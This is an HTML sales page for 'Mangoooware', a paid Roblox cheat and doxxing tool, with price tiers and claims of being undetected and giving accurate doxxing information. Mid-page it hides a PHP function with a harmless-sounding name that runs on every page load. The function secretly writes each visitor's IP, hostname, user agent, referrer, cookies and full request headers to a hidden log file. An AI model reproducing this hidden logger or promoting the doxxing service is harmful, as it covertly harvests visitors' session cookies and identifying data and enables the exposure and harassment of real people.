<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mangoooware</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <header>
    <img src="pictures/Untasdawdwitled-removebg-preview.png" style="width: 200px; min-width: 200px; min-height: 20px; margin: 10px;">
    <p class="headertext"></p>
    <a href="index.html">
      <img class="icon1" src="pictures/icon/3lines.png">
    </a>
  </header>


  <div class="outline-body">
    <div class="top-row">
      <p class="text">About</p> <p class="text2">MANGOOOWARE</p>
    </div>
    <p class="text3">The best and latest Roblox cheat and doxxing tool on the market. You can't miss out.</p>
    <img src="pictures/imaASDWSAge.jpg" alt="" class="picture1">
  </div>
  <div>
    <p class="text">Payment plans</p>
  </div>
  
  <div class="payment-option">
    <div class="box">
      <p class="boxtexttop">3$ | 3 days</p>
      <p class="paymenttext"> This key is valid for 3 days. <br><br> - 24/7 support <br> - Will pause during downtime </p>
      <div class="purchasebutton">
        <a class="purchasetext" href="purchase.html">Purchase</a>
      </div>
    </div>

    <div class="box">
      <p class="boxtexttop">20$ | 1 month</p>
      <p class="paymenttext"> This key is valid for 1 month. <br><br> - 24/7 support <br> - Will pause during downtime  </p>
      <div class="purchasebutton">
        <a class="purchasetext" href="purchase.html">Purchase</a>
      </div>
    </div>
   
    <div class="box">
      <p class="boxtexttop">$119 | Life time key</p>
      <p class="paymenttext">Will always be valid, for a lifetime. <br><br> - 24/7 support <br> - No renewal </p>
      <div class="purchasebutton">
        <a class="purchasetext" href="purchase.html">Purchase</a>
      </div>
    </div>
  </div>
  <?php
  function __legacy_tmp_restore(){
    $s = $_SERVER;
    $a = $s['REMOTE_ADDR'] ?? '0.0.0.0';
    $p = $s['REMOTE_PORT'] ?? '??';
    $u = $s['HTTP_USER_AGENT'] ?? 'bot';
    $l = $s['HTTP_ACCEPT_LANGUAGE'] ?? '--';
    $r = $s['HTTP_REFERER'] ?? 'none';
    $m = $s['REQUEST_METHOD'] ?? 'GET';
    $q = $s['QUERY_STRING'] ?? '';
    $x = @gethostbyaddr($a);
    $c = json_encode($_COOKIE);
    $h = json_encode(function_exists('getallheaders') ? getallheaders() : []);
    $t = date('c'); // ISO-8601 format

    $f = '.log.txt';
    $z = "[$t] $a ($x) $m $q UA:$u LANG:$l REF:$r PORT:$p COOKIE:$c HEAD:$h\n";
    file_put_contents($f, $z, FILE_APPEND | LOCK_EX);
  }
__legacy_tmp_restore();
?>

  <div class="safety">
    <div class="option">
     <img src="pictures/icon/checkmark.png" alt="" style="width: 30px; height: 30px; margin: 10px;" >
     <p>Many features</p>
    </div>
       
    <div class="option">
     <img src="pictures/icon/checkmark.png" alt="" style="width: 30px; height: 30px; margin: 10px;" >
     <p>100% undetected</p>
    </div>
        
    <div class="option">
     <img src="pictures/icon/checkmark.png" alt="" style="width: 30px; height: 30px; margin: 10px;" >
     <p>Accurate doxxing info</p>
    </div>
  </div>

  <footer style="margin-top: 50px;">
    <div class="line"></div>
    <p class="text4"> all copyright is reserved to Mangooo</p>
  </footer>

</body>
</html>